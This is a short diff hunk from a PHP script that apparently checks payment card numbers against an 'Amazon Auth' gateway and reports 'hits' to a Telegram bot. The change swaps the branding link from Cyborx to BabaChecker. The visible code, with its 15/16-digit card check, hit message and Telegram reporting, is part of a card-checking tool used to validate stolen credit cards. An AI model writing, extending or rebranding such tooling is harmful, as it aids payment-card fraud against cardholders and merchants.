@@ -1021,7 +1021,7 @@ if(is_numeric($cc) && strlen($cc) == 16 || is_numeric($cc) && strlen($cc) == 15)
             "<b>Response ➜</b> {$err} 🎉\n" .
             "<b>Gateway ➜</b> Amazon Auth\n" .
             "━━━━━━━━\n" .
-            "<b>Hit From ➜</b> <a href=\"https://cyborx.net\">Cyborx</a>";
+            "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
         // Send messages and log results
         if (!empty($telegramId)) {
             $result = sendTelegramMessage($botToken, $telegramId, $fullResult);
